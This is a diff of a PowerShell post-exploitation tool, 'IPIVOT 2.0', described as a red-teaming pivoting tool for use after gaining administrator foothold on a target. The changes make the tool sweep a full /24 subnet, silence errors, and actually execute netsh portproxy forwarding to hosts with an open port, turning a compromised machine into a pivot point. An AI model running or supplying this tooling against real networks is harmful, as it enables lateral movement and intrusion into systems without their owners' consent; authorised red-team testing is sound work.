@@ -18,8 +18,8 @@ param (
     [int]$ConnectingPort = 9080,
     [int]$ListeningPort = 9999,
     [string]$ListeningAddress = '127.0.0.1',
-    [string]$Network = '192.168.1',
-    [int[]]$HostRange = 1..10
+    [string]$Network = '192.168.0',
+    [int[]]$HostRange = 1..254
 )
 
 Write-Output "
@@ -38,8 +38,9 @@ Write-Output "
      # # # # # #            ##           # #            # #    
                             ##             # #        # #                   
                             ##               # #    # #                       
-                            ##                  ####
-    IPIVOT  - Red Teaming Tool
+                            ##                  ####   2.0
+    
+    IPIVOT 2.0 - Red Teaming Tool
     By: @fort3 - Fortune Sam Okon
     Description: A little pivoting tool for when your favourite meterpreter shell fails...
     Prequisites: Identify and Gain Initial Foothold on Target as Administrator
@@ -47,6 +48,7 @@ Write-Output "
     PS: If you happen to find this tool useful then I wouldn't mind a mention ;)              
  ******************************************************************************* 
  "
+$ErrorActionPreference= 'silentlycontinue'
 
 #list the network and ports found and apply the forwarding
 $i = 1
@@ -54,21 +56,23 @@ foreach ($HostAddress in $HostRange) {
     $ip = "{0}.{1}" -f $network, $HostAddress
     Write-Progress "Scanning Network" $ip -PercentComplete (($i / $HostRange.Count) * 100)
     If (Test-Connection -BufferSize 32 -Count 1 -quiet -ComputerName $ip) {
-        $socket = [System.Net.Sockets.TcpClient]::New($ip, $ConnectingPort)
+        $socket = new-object System.Net.Sockets.TcpClient($ip, $ConnectingPort)
         If ($socket.Connected) {
             "$ip port $ConnectingPort is open"
-            Write-Progress "Forwarding from listening ${ListeningAddress}:$ListeningPort to target`n"
+            Write-Progress "Forwarding from listening ${ListeningAddress}:$ListeningPort to target\n"
             Write-Output "Forwarding from listening ${ListeningAddress}:$ListeningPort to target......."
 
             Write-Output "____________________________________________________________________________________________________________________________"
+            
             #piece of the script that does the forwarding
             try {
-                "netsh interface portproxy add v4tov4 listenaddress=$($ListeningAddress) listenport=$($ListeningPort) connectaddress=$($ip) connectport=$($ConnectingPort)"
+                Invoke-Expression "netsh interface portproxy add v4tov4 listenaddress=$($ListeningAddress) listenport=$($ListeningPort) connectaddress=$($ip) connectport=$($ConnectingPort)"
             } catch {
                 Write-Warning "Could not forward ${ListeningAddress}:$ListeningPort to target......."
             }
             Write-Progress "Checking if host is listening on port $ListeningPort and $ConnectingPort`n"
             Write-Output "Checking if host is listening on port $ListeningPort and $ConnectingPort"
+            
             #verify that the port is listening
             Get-NetTCPConnection -LocalPort $ListeningPort
             Get-NetTCPConnection -LocalPort $ConnectingPort
